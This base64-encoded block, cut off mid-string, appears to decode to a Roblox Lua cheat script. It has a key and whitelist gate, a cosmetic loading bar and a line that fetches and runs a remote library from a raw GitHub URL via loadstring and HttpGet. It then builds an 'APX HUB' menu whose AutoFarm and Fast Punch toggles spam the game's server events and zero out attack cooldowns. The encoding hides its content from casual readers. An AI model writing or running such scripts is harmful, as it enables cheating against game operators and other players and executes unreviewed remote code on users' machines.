VURpbTIubmV3KDAuMSwgMCwgMC40NSwgMCkKa2V5Qm94LlBsYWNlaG9sZGVyVGV4dCA9ICJFbnRlciBrZXkuLi4iCmtleUJveC5UZXh0ID0gIiIKa2V5Qm94LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzNSwgMzUsIDQwKQprZXlCb3guVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCmtleUJveC5Gb250ID0gRW51bS5Gb250LkdvdGhhbQprZXlCb3guVGV4dFNpemUgPSAxMgprZXlCb3guUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIFVJQ29ybmVyMiA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpVSUNvcm5lcjIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNSkKVUlDb3JuZXIyLlBhcmVudCA9IGtleUJveAoKbG9jYWwgc3VibWl0QnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKc3VibWl0QnRuLlNpemUgPSBVRGltMi5uZXcoMC44LCAwLCAwLCAzMCkKc3VibWl0QnRuLlBvc2l0aW9uID0gVURpbTIubmV3KDAuMSwgMCwgMC42NSwgMCkKc3VibWl0QnRuLlRleHQgPSAiVkVSSUZZIEtFWSIKc3VibWl0QnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMjEsIDI0LCAyNCkKc3VibWl0QnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpzdWJtaXRCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCnN1Ym1pdEJ0bi5UZXh0U2l6ZSA9IDEyCnN1Ym1pdEJ0bi5QYXJlbnQgPSBrZXlGcmFtZQoKbG9jYWwgVUlDb3JuZXIzID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpClVJQ29ybmVyMy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA2KQpVSUNvcm5lcjMuUGFyZW50ID0gc3VibWl0QnRuCgpsb2NhbCBzdGF0dXMgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCnN0YXR1cy5TaXplID0gVURpbTIubmV3KDAuOCwgMCwgMCwgMTUpCnN0YXR1cy5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEsIDAsIDAuODUsIDApCnN0YXR1cy5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQpzdGF0dXMuVGV4dCA9ICIiCnN0YXR1cy5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKc3RhdHVzLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCnN0YXR1cy5UZXh0U2l6ZSA9IDEwCnN0YXR1cy5QYXJlbnQgPSBrZXlGcmFtZQoKLS0gTG9hZGluZyBCYXIgRWxlbWVudHMgKGluaXRpYWxseSBoaWRkZW4pCmxvY2FsIGxvYWRpbmdCYXJCYWNrZ3JvdW5kID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCmxvYWRpbmdCYXJCYWNrZ3JvdW5kLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkgLS0gU3RhcnQgYXMgdGlueSBib3gKbG9hZGluZ0JhckJhY2tncm91bmQuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjU1LCAwKSAtLSBDZW50ZXIgcG9zaXRpb24KbG9hZGluZ0JhckJhY2tncm91bmQuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNDUpCmxvYWRpbmdCYXJCYWNrZ3JvdW5kLlZpc2libGUgPSBmYWxzZQpsb2FkaW5nQmFyQmFja2dyb3VuZC5QYXJlbnQgPSBrZXlGcmFtZQoKbG9jYWwgbG9hZGluZ0JhclVJQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCmxvYWRpbmdCYXJVSUNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAxMCkKbG9hZGluZ0JhclVJQ29ybmVyLlBhcmVudCA9IGxvYWRpbmdCYXJCYWNrZ3JvdW5kCgpsb2NhbCBsb2FkaW5nQmFyID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCmxvYWRpbmdCYXIuU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAxLCAwKQpsb2FkaW5nQmFyLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCmxvYWRpbmdCYXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMjAwLCAyNTUpCmxvYWRpbmdCYXIuUGFyZW50ID0gbG9hZGluZ0JhckJhY2tncm91bmQKCmxvY2FsIGxvYWRpbmdCYXJDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKbG9hZGluZ0JhckNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAxMCkKbG9hZGluZ0JhckNvcm5lci5QYXJlbnQgPSBsb2FkaW5nQmFyCgpsb2NhbCBsb2FkaW5nVGV4dCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKbG9hZGluZ1RleHQuU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDE1KQpsb2FkaW5nVGV4dC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEsIDAsIDAuNywgMCkKbG9hZGluZ1RleHQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKbG9hZGluZ1RleHQuVGV4dCA9ICJWZXJpZnlpbmcgUGxheWVyLi4uIgpsb2FkaW5nVGV4dC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDI1NSkKbG9hZGluZ1RleHQuRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KbG9hZGluZ1RleHQuVGV4dFNpemUgPSAxMQpsb2FkaW5nVGV4dC5WaXNpYmxlID0gZmFsc2UKbG9hZGluZ1RleHQuUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIHBlcmNlbnRhZ2VUZXh0ID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQpwZXJjZW50YWdlVGV4dC5TaXplID0gVURpbTIubmV3KDAuOCwgMCwgMCwgMTUpCnBlcmNlbnRhZ2VUZXh0LlBvc2l0aW9uID0gVURpbTIubmV3KDAuMSwgMCwgMC41NSwgMCkKcGVyY2VudGFnZVRleHQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKcGVyY2VudGFnZVRleHQuVGV4dCA9ICIwJSIKcGVyY2VudGFnZVRleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCnBlcmNlbnRhZ2VUZXh0LkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZApwZXJjZW50YWdlVGV4dC5UZXh0U2l6ZSA9IDEyCnBlcmNlbnRhZ2VUZXh0LlZpc2libGUgPSBmYWxzZQpwZXJjZW50YWdlVGV4dC5QYXJlbnQgPSBrZXlGcmFtZQoKLS0gSG92ZXIgZWZmZWN0cwpzdWJtaXRCdG4uTW91c2VFbnRlcjpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKHN1Ym1pdEJ0biwgVHdlZW5JbmZvLm5ldygwLjIpLCB7QmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgNTAsIDUwKX0pOlBsYXkoKQplbmQpCgpzdWJtaXRCdG4uTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKHN1Ym1pdEJ0biwgVHdlZW5JbmZvLm5ldygwLjIpLCB7QmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIyMSwgMjQsIDI0KX0pOlBsYXkoKQplbmQpCgotLSBTaGFrZSBmdW5jdGlvbiBmb3Igd3Jvbmcga2V5CmxvY2FsIGZ1bmN0aW9uIHNoYWtlRnJhbWUoKQogICAgbG9jYWwgb3JpZ2luYWxQb3NpdGlvbiA9IGtleUZyYW1lLlBvc2l0aW9uCiAgICBsb2NhbCBzaGFrZUludGVuc2l0eSA9IDUKICAgIAogICAgZm9yIGkgPSAxLCA2IGRvCiAgICAgICAgbG9jYWwgb2Zmc2V0WCA9IG1hdGgucmFuZG9tKC1zaGFrZUludGVuc2l0eSwgc2hha2VJbnRlbnNpdHkpCiAgICAgICAgbG9jYWwgb2Zmc2V0WSA9IG1hdGgucmFuZG9tKC1zaGFrZUludGVuc2l0eSwgc2hha2VJbnRlbnNpdHkpCiAgICAgICAgCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKTpDcmVhdGUoCiAgICAgICAgICAgIGtleUZyYW1lLCAKICAgICAgICAgICAgVHdlZW5JbmZvLm5ldygwLjA1LCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwKICAgICAgICAgICAge1Bvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTE2MCArIG9mZnNldFgsIDAuNSwgLTEwMCArIG9mZnNldFkpfQogICAgICAgICk6UGxheSgpCiAgICAgICAgCiAgICAgICAgd2FpdCgwLjA1KQogICAgZW5kCiAgICAKICAgIC0tIFJldHVybiB0byBvcmlnaW5hbCBwb3NpdGlvbgogICAgZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKTpDcmVhdGUoCiAgICAgICAga2V5RnJhbWUsIAogICAgICAgIFR3ZWVuSW5mby5uZXcoMC4xLCBFbnVtLkVhc2luZ1N0eWxlLkJhY2ssIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksCiAgICAgICAge1Bvc2l0aW9uID0gb3JpZ2luYWxQb3NpdGlvbn0KICAgICk6UGxheSgpCmVuZAoKLS0gU1VDQ0VTUzogTWFrZSBib3JkZXIgZ3JlZW4gdGVtcG9yYXJpbHkKbG9jYWwgZnVuY3Rpb24gZmxhc2hTdWNjZXNzQm9yZGVyKCkKICAgIGxvY2FsIG9yaWdpbmFsQ29sb3JzID0gewogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoNTEsIDUxLCA1MSkpLAogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29sb3IzLmZyb21SR0IoMjIxLCAyNCwgMjQpKQogICAgfQogICAgCiAgICAtLSBGbGFzaCBncmVlbgogICAgZ3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7CiAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQig1MCwgMjAwLCA1MCkpLAogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29sb3IzLmZyb21SR0IoMTAwLCAyNTUsIDEwMCkpCiAgICB9KQogICAgCiAgICB3YWl0KDAuOCkKICAgIAogICAgLS0gUmV0dXJuIHRvIG9yaWdpbmFsIGNvbG9ycwogICAgZ3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyhvcmlnaW5hbENvbG9ycykKZW5kCgotLSBTaHJpbmsgZWxlbWVudHMgaW50byBsb2FkaW5nIGJveApsb2NhbCBmdW5jdGlvbiBzaHJpbmtJbnRvTG9hZGluZ0JveCgpCiAgICBsb2NhbCB0d2VlblNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpCiAgICAKICAgIC0tIE1ha2UgbG9hZGluZyBib3ggdmlzaWJsZSBidXQgdGlueQogICAgbG9hZGluZ0JhckJhY2tncm91bmQuVmlzaWJsZSA9IHRydWUKICAgIGxvYWRpbmdCYXJCYWNrZ3JvdW5kLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkKICAgIGxvYWRpbmdCYXJCYWNrZ3JvdW5kLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41NSwgMCkKICAgIAogICAgLS0gS2V5Qm94IHNocmlua3MgdG8gY2VudGVyIGFuZCBmYWRlcwogICAgbG9jYWwga2V5Qm94U2hyaW5rID0gdHdlZW5TZXJ2aWNlOkNyZWF0ZSgKICAgICAgICBrZXlCb3gsCiAgICAgICAgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuQmFjaywgRW51bS5FYXNpbmdEaXJlY3Rpb24uSW4pLAogICAgICAgIHsKICAgICAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKSwKICAgICAgICAgICAgUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjU1LCAwKSwKICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEsCiAgICAgICAgICAgIFRleHRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgfQogICAgKQogICAgCiAgICAtLSBTdWJtaXRCdG4gc2hyaW5rcyB0byBjZW50ZXIgYW5kIGZhZGVzCiAgICBsb2NhbCBzdWJtaXRCdG5TaHJpbmsgPSB0d2VlblNlcnZpY2U6Q3JlYXRlKAogICAgICAgIHN1Ym1pdEJ0biwKICAgICAgICBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5CYWNrLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5JbiksCiAgICAgICAgewogICAgICAgICAgICBTaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApLAogICAgICAgICAgICBQb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNTUsIDApLAogICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMSwKICAgICAgICAgICAgVGV4dFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICB9CiAgICApCiAgICAKICAgIC0tIFBsYXkgc2hyaW5rIGFuaW1hdGlvbnMKICAgIGtleUJveFNocmluazpQbGF5KCkKICAgIHN1Ym1pdEJ0blNocmluazpQbGF5KCkKICAgIAogICAgd2FpdCgwLjYpCiAgICAKICAgIC0tIE5vdyBleHBhbmQgdGhlIGxvYWRpbmcgYm94IGludG8gZnVsbCBsb2FkaW5nIGJhcgogICAgbG9jYWwgZXhwYW5kQm94ID0gdHdlZW5TZXJ2aWNlOkNyZWF0ZSgKICAgICAgICBsb2FkaW5nQmFyQmFja2dyb3VuZCwKICAgICAgICBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FbGFzdGljLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLAogICAgICAgIHsKICAgICAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDIwKSwKICAgICAgICAgICAgUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xLCAwLCAwLjQ1LCAwKQogICAgICAgIH0KICAgICkKICAgIAogICAgZXhwYW5kQm94OlBsYXkoKQogICAgCiAgICB3YWl0KDAuNykKZW5kCgotLSBMb2FkaW5nIGJhciBhbmltYXRpb24KbG9jYWwgZnVuY3Rpb24gYW5pbWF0ZUxvYWRpbmdCYXIoKQogICAgbG9hZGluZ1RleHQuVmlzaWJsZSA9IHRydWUKICAgIHBlcmNlbnRhZ2VUZXh0LlZpc2libGUgPSB0cnVlCiAgICAKICAgIC0tIEZhZGUgaW4gdGV4dCBlbGVtZW50cwogICAgbG9hZGluZ1RleHQuVGV4dFRyYW5zcGFyZW5jeSA9IDEKICAgIHBlcmNlbnRhZ2VUZXh0LlRleHRUcmFuc3BhcmVuY3kgPSAxCiAgICAKICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKAogICAgICAgIGxvYWRpbmdUZXh0LAogICAgICAgIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksCiAgICAgICAge1RleHRUcmFuc3BhcmVuY3kgPSAwfQogICAgKTpQbGF5KCkKICAgIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKTpDcmVhdGUoCiAgICAgICAgcGVyY2VudGFnZVRleHQsCiAgICAgICAgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwKICAgICAgICB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9CiAgICApOlBsYXkoKQogICAgCiAgICB3YWl0KDAuNSkKICAgIAogICAgLS0gU3RhcnQgbG9hZGluZyBwcm9ncmVzcwogICAgbG9jYWwgdG90YWxUaW1lID0gMi41IC0tIDIuNSBzZWNvbmRzIHRvdGFsCiAgICBsb2NhbCBzdGVwcyA9IDEwMAogICAgbG9jYWwgc3RlcFRpbWUgPSB0b3RhbFRpbWUgLyBzdGVwcwogICAgCiAgICBmb3IgaSA9IDAsIHN0ZXBzIGRvCiAgICAgICAgbG9jYWwgcHJvZ3Jlc3MgPSBpIC8gc3RlcHMKICAgICAgICBsb2FkaW5nQmFyLlNpemUgPSBVRGltMi5uZXcocHJvZ3Jlc3MsIDAsIDEsIDApCiAgICAgICAgcGVyY2VudGFnZVRleHQuVGV4dCA9IG1hdGguZmxvb3IocHJvZ3Jlc3MgKiAxMDApIC4uICIlIgogICAgICAgIAogICAgICAgIC0tIENoYW5nZSBjb2xvciBiYXNlZCBvbiBwcm9ncmVzcwogICAgICAgIGlmIHByb2dyZXNzIDwgMC4zMyB0aGVuCiAgICAgICAgICAgIGxvYWRpbmdCYXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgODAsIDgwKSAtLSBSZWQKICAgICAgICBlbHNlaWYgcHJvZ3Jlc3MgPCAwLjY2IHRoZW4KICAgICAgICAgICAgbG9hZGluZ0Jhci5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAxODAsIDYwKSAtLSBPcmFuZ2UKICAgICAgICBlbHNlCiAgICAgICAgICAgIGxvYWRpbmdCYXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMjU1LCAxMDApIC0tIEdyZWVuCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgd2FpdChzdGVwVGltZSkKICAgIGVuZAplbmQKCi0tIENoZWNrIGlmIHVzZXIgaXMgd2hpdGVsaXN0ZWQKbG9jYWwgZnVuY3Rpb24gaXNVc2VyV2hpdGVsaXN0ZWQoKQogICAgbG9jYWwgcGxheWVyTmFtZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5OYW1lOmxvd2VyKCkKICAgIGZvciBfLCB3aGl0ZWxpc3RlZE5hbWUgaW4gaXBhaXJzKHdoaXRlbGlzdGVkVXNlcnMpIGRvCiAgICAgICAgaWYgcGxheWVyTmFtZSA9PSB3aGl0ZWxpc3RlZE5hbWU6bG93ZXIoKSB0aGVuCiAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBmYWxzZQplbmQKCi0tIEJ1dHRvbiBjbGljayBmdW5jdGlvbgpsb2NhbCBmdW5jdGlvbiB2ZXJpZnlLZXkoKQogICAgbG9jYWwgZW50ZXJlZEtleSA9IGtleUJveC5UZXh0OmdzdWIoIiVzKyIsICIiKTp1cHBlcigpCiAgICBsb2NhbCBpc1doaXRlbGlzdGVkID0gaXNVc2VyV2hpdGVsaXN0ZWQoKQogICAgbG9jYWwga2V5VmFsaWQgPSBmYWxzZQogICAgCiAgICAtLSBDaGVjayBpZiBrZXkgaXMgdmFsaWQKICAgIGZvciBfLCB2YWxpZEtleSBpbiBwYWlycyh2YWxpZEtleXMpIGRvCiAgICAgICAgaWYgZW50ZXJlZEtleSA9PSB2YWxpZEtleSB0aGVuCiAgICAgICAgICAgIGtleVZhbGlkID0gdHJ1ZQogICAgICAgICAgICBicmVhawogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGlmIGlzV2hpdGVsaXN0ZWQgYW5kIGtleVZhbGlkIHRoZW4KICAgICAgICAtLSBXaGl0ZWxpc3RlZCB1c2VyIHdpdGggY29ycmVjdCBrZXkgLSBTSFJJTksgVE8gTE9BRElORyBCT1gKICAgICAgICBmbGFzaFN1Y2Nlc3NCb3JkZXIoKSAtLSBHUkVFTiBCT1JERVIgRkxBU0gKICAgICAgICBzaHJpbmtJbnRvTG9hZGluZ0JveCgpCiAgICAgICAgCiAgICAgICAgLS0gU3RhcnQgbG9hZGluZyBhbmltYXRpb24KICAgICAgICBhbmltYXRlTG9hZGluZ0JhcigpCiAgICAgICAgCiAgICAgICAgLS0gV2FpdCBmb3IgbG9hZGluZyB0byBjb21wbGV0ZQogICAgICAgIHdhaXQoMC41KQogICAgICAgIAogICAgICAgIC0tIFNob3cgZmluYWwgcmVzdWx0CiAgICAgICAgbG9hZGluZ1RleHQuVGV4dCA9ICLinIUgV2hpdGVsaXN0ZWQgLSBBY2Nlc3MgR3JhbnRlZCEiCiAgICAgICAgbG9hZGluZ1RleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMjU1LCAxMDApCiAgICAgICAgcGVyY2VudGFnZVRleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMjU1LCAxMDApCiAgICAgICAgCiAgICAgICAgd2FpdCgxLjUpCiAgICAgICAga2V5R3VpOkRlc3Ryb3koKQogICAgICAgIAotLSBMb2FkIFVJIExpYnJhcnkKbG9jYWwgTGlicmFyeSA9IGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRHlsYW5ubjY5L1NIRVNITExMTExMTDEyM1BST1RFQ1RFRC9yZWZzL2hlYWRzL21haW4vTGlicmFyeS5sdWEiKSkoKQoKLS0gQ3JlYXRlIE1haW4gV2luZG93CmxvY2FsIFdpbmRvdyA9IExpYnJhcnk6V2luZG93KHsKICAgIFRpdGxlID0gIkFQWCBIVUIgfHwgUFJJVkFURSDigJQgSGVsbG8gIiAuLiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuRGlzcGxheU5hbWUsCiAgICBEZXNjID0gIkJ5IDogRHlsYW4iLAogICAgSWNvbiA9IGhvdXNlLAogICAgVGhlbWUgPSAiRGFyayIsCiAgICBDb25maWcgPSB7CiAgICAgICAgS2V5YmluZCA9IEVudW0uS2V5Q29kZS5MZWZ0Q29udHJvbCwKICAgICAgICBTaXplID0gVURpbTIubmV3KDAsIDUwMCwgMCwgNDAwKQogICAgfSwKICAgIENsb3NlVUlCdXR0b24gPSB7CiAgICAgICAgRW5hYmxlZCA9IHRydWUsCiAgICAgICAgVGV4dCA9ICJPcGVuL0Nsb3NlIgogICAgfQp9KQoKLS0gU2lkZWJhciBWZXJ0aWNhbCBTZXBhcmF0b3IKbG9jYWwgU2lkZWJhckxpbmUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKU2lkZWJhckxpbmUuU2l6ZSA9IFVEaW0yLm5ldygwLCAxLCAxLCAwKQpTaWRlYmFyTGluZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxNDAsIDAsIDApClNpZGViYXJMaW5lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig2MCwgNjAsIDYwKQpTaWRlYmFyTGluZS5Cb3JkZXJTaXplUGl4ZWwgPSAwClNpZGViYXJMaW5lLlpJbmRleCA9IDUKU2lkZWJhckxpbmUuTmFtZSA9ICJTaWRlYmFyTGluZSIKU2lkZWJhckxpbmUuUGFyZW50ID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikKCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgcGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCByU3RvID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpIApsb2NhbCBzbmFja3MgPSB7IlRPVUdIIEJhciIsICJQcm90ZWluIFNoYWtlIiwgIlByb3RlaW4gQmFyIiwgIlVMVFJBIFNoYWtlIiwgIkVuZXJneSBTaGFrZSIsICJFbmVyZ3kgQmFyIiwgIlRyb3BpY2FsIFNoYWtlIn0KbG9jYWwgcHJvdGVpbkVnZ05hbWUgPSAiUHJvdGVpbiBFZ2ciCmxvY2FsIGRlbGF5VGltZSA9IDI5ICogNjAgKyAzMCAtLSAyOSBtaW51dGVzIDMwIHNlY29uZHMKICAgICAgICAKLS0gRmFybSBPUCBUYWIKbG9jYWwgQXV0b0Zhcm0gPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJGYXJtIE9QIiwgSWNvbiA9ICJkdW1iYmVsbCJ9KQoKLS0gRmFybSBUb29scyBTZWN0aW9uCkF1dG9GYXJtOlNlY3Rpb24oe1RpdGxlID0gIkZBUk0gVE9PTFMifSkKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvRmFybSB3ZWlnaHRzIiwKICAgIERlc2MgPSAiRXF1aXAgYW55IGZhcm1pbmcgdG9vbHMiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgd2hpbGUgc3RhdGUgZG8KICAgICAgICAgICAgbG9jYWwgYXJncyA9IHtbMV0gPSAicmVwIn0KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcih1bnBhY2soYXJncykpICAKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikuUmVuZGVyU3RlcHBlZDpXYWl0KCkgIAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBGYXN0IFB1bmNoCmxvY2FsIGZ1bmN0aW9uIGF1dG9GYXN0UHVuY2goKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgIHdoaWxlIF9HLmZhc3RQdW5jaCBkbwogICAgICAgIGxvY2FsIHB1bmNoVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgIGlmIHB1bmNoVG9vbCB0aGVuCiAgICAgICAgICAgIHB1bmNoVG9vbC5QYXJlbnQgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCBwdW5jaCA9IGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpCiAgICAgICAgaWYgcHVuY2ggYW5kIHB1bmNoOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbgogICAgICAgICAgICBwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMAogICAgICAgIGVuZAoKICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAibGVmdEhhbmQiKQogICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJyaWdodEhhbmQiKQogICAgICAgIHRhc2sud2FpdCgwLjAwMSkKICAgIGVuZAoKICAgIGxvY2FsIHB1bmNoID0gcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgaWYgcHVuY2ggYW5kIHB1bmNoOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbgogICAgICAgIHB1bmNoLmF0dGFja1RpbWUuVmFsdWUgPSAwLjM1CiAgICBlbmQKCiAgICBpZiBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIHRoZW4KICAgICAgICBwbGF5ZXIuQ2hhcmFjdGVyLlB1bmNoLlBhcmVudCA9IHBsYXllci5CYWNrcGFjawogICAgZW5kCmVuZAoKQXV0b0Zhcm06VG9nZ2xlKHsKICAgIFRpdGxlID0gIkZhc3QgUHVuY2giLAogICAgRGVzYyA9ICJSYXBpZCBwdW5jaCBhdXRvbWF0aW9uIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIF9HLmZhc3RQdW5jaCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICBhdXRvRmFzdFB1bmNoKCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQXV0byBQdW5jaApsb2NhbCBmdW5jdGl